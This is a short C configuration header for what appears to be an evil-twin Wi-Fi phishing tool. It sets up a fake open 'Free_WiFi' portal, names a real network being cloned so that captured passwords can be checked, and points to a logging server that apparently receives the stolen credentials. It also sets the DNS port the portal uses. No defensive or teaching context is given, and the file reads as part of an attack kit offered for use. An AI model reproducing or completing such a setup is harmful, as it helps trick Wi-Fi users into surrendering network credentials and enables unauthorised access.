#ifndef CONFIG_H
#define CONFIG_H

// ===== AP (fake portal) settings =====
#define AP_SSID     "Free_WiFi"
#define AP_PASS     ""            // "" = open network; or set a password
#define AP_CHANNEL  6
#define AP_MAX_STA  4

// ===== Target network being cloned (for credential validation) =====
#define TARGET_SSID "Real_Network"

// ===== Logging server =====
#define LOG_SERVER_HOST "192.168.1.100"   // your Termux/PC IP
#define LOG_SERVER_PORT 5000
#define LOG_SERVER_PATH "/log"

// ===== DNS / portal =====
#define DNS_PORT 53

#endif
